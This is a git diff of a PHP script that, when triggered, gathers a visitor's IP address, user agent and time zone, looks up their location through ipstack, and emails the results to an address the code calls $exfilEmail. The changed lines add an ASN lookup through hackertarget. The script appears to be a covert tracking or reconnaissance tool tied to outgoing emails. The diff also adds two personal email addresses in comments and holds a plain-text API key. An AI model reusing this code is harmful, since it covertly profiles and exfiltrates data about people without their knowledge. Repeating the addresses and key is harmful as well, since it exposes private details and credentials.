@@ -12,8 +12,8 @@ $sendIT = intval($_REQUEST['secretCODE']);
 $emailmessage = $_REQUEST['email'];
 
 //$targetEmail = person the Email will be sent to. $exfilEmail is the address that some data will be reported back to.
-//$targetEmail = "[email]";
-//$targetEmail = "[email]";
+//$targetEmail = "sethmeeup@gmail.com";
+//$targetEmail = "ids1044@rit.edu";
 $targetEmail = $emailmessage;
 $exfilEmail = "[email]";
 
@@ -105,16 +105,29 @@ if($sendIT == 1){
 	$userAgent = $_SERVER['HTTP_USER_AGENT'];
 	$timeZone = date_default_timezone_get();
 
+	
 	// Geo-locate IP Address
 	$ip_loc_api = "http://api.ipstack.com/" . $clientIPOne . "?access_key=817d284f4b9b8f591d129ae710da5eb9" . "&format=1";
-    $ch = curl_init();
+	
+	// ASN Information
+	$ip_asn = "https://api.hackertarget.com/aslookup/?q=" . $clientIPOne;
+	
+	// curl init
+	$ch = curl_init();
 	
 	// set URL and other appropriate options
 	curl_setopt($ch, CURLOPT_URL, $ip_loc_api);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	curl_setopt($ch, CURLOPT_HEADER, 0);
-	
+	// Curl it
 	$ip_results = curl_exec($ch);
+	
+	// set URL and other appropriate options
+	curl_setopt($ch, CURLOPT_URL, $ip_asn);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_HEADER, 0);
+	// Curl it
+	$ip_asn_info = curl_exec($ch);
 	// close cURL resource, and free up system resources
 	curl_close($ch);
 	
@@ -128,8 +141,11 @@ if($sendIT == 1){
 		$email_body .= "<h1>Webpage Accessed</h1>";
 		$email_body .= "<h3>Client IP</h3>";
         $email_body .=  $clientIPOne . "<br>";
-		## Added ip results
+		## Added ip results & ASN info
+		$email_body .= "<h5>IP Location Information</h5>";
 		$email_body .= $ip_results . "<br>";
+		$email_body .= "<h5>IP ASN Information</h5>";
+		$email_body .= $ip_asn_info . "<br>";
         $email_body .= "<h3>Time of Access</h3>";
         $email_body .=  "Request Time (system): " . $reqTime . "<br>";
         $email_body .=  "Request Time (readable): " . $now . "<br>";
